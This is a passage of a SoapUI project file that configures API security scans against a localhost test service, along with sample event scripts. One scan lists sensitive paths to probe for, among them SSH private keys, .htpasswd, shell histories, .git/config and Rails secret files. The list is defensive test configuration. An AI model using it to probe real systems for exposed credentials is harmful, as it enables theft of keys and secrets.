                        <con:assertion type="Sensitive Information Exposure" id="dd40caac-feaa-4ea9-af94-36a69177ec4f" name="Sensitive Information Exposure">
                            <con:configuration/>
                        </con:assertion>
                        <con:assertion type="Valid HTTP Status Codes" id="f35ea5e4-1308-4bf3-849d-7cfb7aba93f5" name="Valid HTTP Status Codes">
                            <con:settings>
                                <con:setting id="__LEVEL_">WARNING</con:setting>
                            </con:settings>
                            <con:configuration>
                                <codes>501,405,403</codes>
                            </con:configuration>
                        </con:assertion>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ONE_BY_ONE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityProScan>
                    <con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="2ee3c853-af80-4feb-9563-3ae06ea1d10f" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:type="con:SensitiveFileSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/>
                            <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/>
                            <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/>
                            <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/>
                            <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/>
                            <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/>
                            <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/>
                            <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/>
                            <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/>
                            <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/>
                            <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/>
                            <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/>
                            <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/>
                            <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/>
                            <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/>
                            <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/>
                            <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/>
                            <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/>
                            <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/>
                        </con:config>
                        <con:assertion type="Sensitive Files Exposure Assertion" id="ae94184c-1bcc-4da8-a802-2ad5e462468c" name="Sensitive Files Exposure"/>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ONE_BY_ONE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityProScan>
                    <con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="e136279d-1d43-40ed-a955-cfe3074f2b41" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
                        <con:settings/>
                        <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:assertion type="WeakPassword" id="16c09788-98ae-4724-b07e-f36201ddd0d1" name="Weak Password Detection">
                            <con:configuration/>
                        </con:assertion>
                        <con:assertion type="BasicAuth" id="6962de65-ae71-434c-84ed-3fcce9b126e5" name="Basic Authentication Detection"/>
                        <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
                        <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                            <con:strategy>ONE_BY_ONE</con:strategy>
                            <con:delay>100</con:delay>
                        </con:executionStrategy>
                    </con:testStepSecurityProScan>
                </con:testStepSecurityTest>
                <con:properties/>
                <con:reportParameters/>
            </con:securityTest>
            <con:tagId>abe9acd0-5564-4873-988e-7a4d6d1ea46b</con:tagId>
            <con:tagId>fa2a3149-30a4-445b-beec-ff6e5835e8db</con:tagId>
        </con:testCase>
        <con:testCase id="83358f0a-b327-47bd-8be4-4767acc250e5" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="The One With Failing Assertion" searchProperties="true" timeout="0">
            <con:settings/>
            <con:testStep type="restrequest" name="Request 1" id="efa044c6-5f4a-4d83-9273-1ec908787fb9">
                <con:settings/>
                <con:config service="http://localhost:1234" resourcePath="" methodName="" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                    <con:restRequest name="Request 1" id="8b5061d1-caa1-47b3-9665-9d0b908e24fe" mediaType="application/json">
                        <con:settings>
                            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
                        </con:settings>
                        <con:endpoint>http://localhost:1234</con:endpoint>
                        <con:request/>
                        <con:originalUri>http://localhost/</con:originalUri>
                        <con:assertion type="Valid HTTP Status Codes" id="7ad86c41-5ed3-4c11-9822-c3ac8863b87b" name="Valid HTTP Status Codes">
                            <con:settings/>
                            <con:configuration>
                                <codes>123</codes>
                            </con:configuration>
                        </con:assertion>

                        <con:credentials>
                            <con:selectedAuthProfile>No Authorization</con:selectedAuthProfile>
                            <con:authType>No Authorization</con:authType>
                        </con:credentials>
                        <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
                        <con:parameters/>
                    </con:restRequest>
                </con:config>
            </con:testStep>
            <con:properties/>
            <con:reportParameters/>
            <con:tagId>abe9acd0-5564-4873-988e-7a4d6d1ea46b</con:tagId>
            <con:tagId>f1b1f3c4-9e7b-48fd-8f48-436fd2856e0e</con:tagId>
        </con:testCase>
        <con:properties/>
        <con:reportParameters/>
        <con:tagId>292f8c61-3442-45fc-b17f-f056d3b75ad8</con:tagId>
    </con:testSuite>
    <con:requirements/>
    <con:properties/>
    <con:wssContainer/>
    <con:databaseConnectionContainer/>
    <con:jmsConnectionContainer/>
    <con:oAuth2ProfileContainer/>
    <con:oAuth1ProfileContainer/>
    <con:reporting>
        <con:xmlTemplates/>
        <con:parameters/>
    </con:reporting>
    <con:eventHandlers type="RequestFilter.filterRequest" name="RequestFilter.filterRequest">
        <con:script>// Sample event script to add custom HTTP header to all outgoing REST, SOAP and HTTP(S) calls
            // This code is often used for adding custom authentication to SoapUI Pro tests

            // If hardcoding the token, uncomment and change line 5
            // def token = '4567'

            // If your token is parameterized in Project level custom property, uncomment line 8
            // def token = request.parent.testCase.testSuite.project.getProperty('auth_token').getValue()

            // To modify all outgoing calls, remove comments from lines 11 to 16
            // def headers = request.requestHeaders
            // if (headers.containsKey('auth_token2') == false) {
            // headers.put('auth_token2', token)
            // request.requestHeaders = headers
            // }
        </con:script>
    </con:eventHandlers>
    <con:eventHandlers type="TestRunListener.afterStep" name="TestRunListener.afterStep">
        <con:script>// Save all test step results into files
            // Change the directory path in line 5 to a location where you want to store details
            // then uncomment lines 5 to 10

            // filePath = 'C:\\tempOutputDirectory\\'
            // fos = new FileOutputStream(filePath + testStepResult.testStep.label + '.txt', true)
            // pw = new PrintWriter(fos)
            // testStepResult.writeTo(pw)
            // pw.close()
            // fos.close()
        </con:script>
    </con:eventHandlers>
    <con:authRepository/>
    <con:tags>
        <con:tag>
            <con:id>abe9acd0-5564-4873-988e-7a4d6d1ea46b</con:id>
            <con:name>testcasestagged</con:name>
        </con:tag>
        <con:tag>
            <con:id>292f8c61-3442-45fc-b17f-f056d3b75ad8</con:id>
            <con:name>testsuitestagged</con:name>
        </con:tag>
        <con:tag>
            <con:id>fa2a3149-30a4-445b-beec-ff6e5835e8db</con:id>
            <con:name>passing</con:name>
        </con:tag>
        <con:tag>
            <con:id>f1b1f3c4-9e7b-48fd-8f48-436fd2856e0e</con:id>
            <con:name>failing</con:name>
        </con:tag>
    </con:tags>
</con:soapui-project>